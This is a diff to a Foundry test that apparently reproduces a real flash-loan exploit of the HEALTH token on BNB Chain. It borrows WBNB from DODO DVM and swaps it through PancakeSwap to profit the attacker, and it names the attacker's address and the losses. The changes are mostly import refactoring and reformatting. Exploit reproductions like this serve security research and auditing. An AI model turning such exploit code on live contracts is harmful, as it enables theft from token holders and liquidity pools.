@@ -2,7 +2,14 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
+
+import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+
+import {IWBNB} from "src/interfaces/IWBNB.sol";
+
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
+import {IDVM} from "src/interfaces/IDVM.sol";
 
 // @KeyInfo - Total Lost : ~16.64 BNB
 // Attacker : 0xDE78112FF006f166E4ccfe1dfE4181C9619D3b5D
@@ -17,11 +24,14 @@ import "./../interface.sol";
 // Twitter BlockSecTeam : https://twitter.com/BlockSecTeam/status/1583073442433495040
 
 contract ContractTest is Test {
-
-    IERC20 constant HEALTH_TOKEN = IERC20(0x32B166e082993Af6598a89397E82e123ca44e74E);
-    IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
-    Uni_Pair_V2 constant WBNB_HEALTH_PAIR = Uni_Pair_V2(0xF375709DbdE84D800642168c2e8bA751368e8D32);
-    Uni_Router_V2 constant PS_ROUTER = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IERC20 constant HEALTH_TOKEN =
+        IERC20(0x32B166e082993Af6598a89397E82e123ca44e74E);
+    IWBNB constant WBNB_TOKEN =
+        IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
+    IUniswapV2Pair constant WBNB_HEALTH_PAIR =
+        IUniswapV2Pair(0xF375709DbdE84D800642168c2e8bA751368e8D32);
+    IUniswapV2Router constant PS_ROUTER =
+        IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     address constant DODO_DVM = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;
 
     function setUp() public {
@@ -33,12 +43,17 @@ contract ContractTest is Test {
         vm.label(address(PS_ROUTER), "PS_ROUTER");
         vm.label(DODO_DVM, "DODO_DVM");
         vm.label(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, "BUSD");
-        vm.label(0x64d868F307263f8566172fc42D75Ea03A5690271, "HEALTH_DEV_ADDRESS");
+        vm.label(
+            0x64d868F307263f8566172fc42D75Ea03A5690271,
+            "HEALTH_DEV_ADDRESS"
+        );
     }
 
     function testExploit() public {
         emit log_named_decimal_uint(
-            "[Start] Attacker WBNB balance before exploit", WBNB_TOKEN.balanceOf(address(this)), 18
+            "[Start] Attacker WBNB balance before exploit",
+            WBNB_TOKEN.balanceOf(address(this)),
+            18
         );
 
         // Approving PancakeSwap router to spend attacker's WBNB and HEALTH
@@ -46,10 +61,12 @@ contract ContractTest is Test {
         HEALTH_TOKEN.approve(address(PS_ROUTER), type(uint256).max);
 
         // Requesting 40 WBNB via flashloan from DODO DVM. Payload is in the callback (DPPFlashLoanCall).
-        DVM(DODO_DVM).flashLoan(40 * 1e18, 0, address(this), new bytes(1));
+        IDVM(DODO_DVM).flashLoan(40 * 1e18, 0, address(this), new bytes(1));
 
         emit log_named_decimal_uint(
-            "[End] Attacker WBNB balance after exploit", WBNB_TOKEN.balanceOf(address(this)), 18
+            "[End] Attacker WBNB balance after exploit",
+            WBNB_TOKEN.balanceOf(address(this)),
+            18
         );
     }
 
@@ -57,9 +74,9 @@ contract ContractTest is Test {
      * Callback function called by DODO DVM during the flashloan
      */
     function DPPFlashLoanCall(
-        address, /*sender*/
-        uint256, /*baseAmount*/
-        uint256, /*quoteAmount*/
+        address /*sender*/,
+        uint256 /*baseAmount*/,
+        uint256 /*quoteAmount*/,
         bytes calldata /*data*/
     ) external {
         // Swap all WBNB to HEALTH
@@ -87,7 +104,11 @@ contract ContractTest is Test {
         path[0] = address(WBNB_TOKEN);
         path[1] = address(HEALTH_TOKEN);
         PS_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            WBNB_TOKEN.balanceOf(address(this)), 0, path, address(this), block.timestamp
+            WBNB_TOKEN.balanceOf(address(this)),
+            0,
+            path,
+            address(this),
+            block.timestamp
         );
     }
 
@@ -99,8 +120,11 @@ contract ContractTest is Test {
         path[0] = address(HEALTH_TOKEN);
         path[1] = address(WBNB_TOKEN);
         PS_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            HEALTH_TOKEN.balanceOf(address(this)), 0, path, address(this), block.timestamp
+            HEALTH_TOKEN.balanceOf(address(this)),
+            0,
+            path,
+            address(this),
+            block.timestamp
         );
     }
-
 }
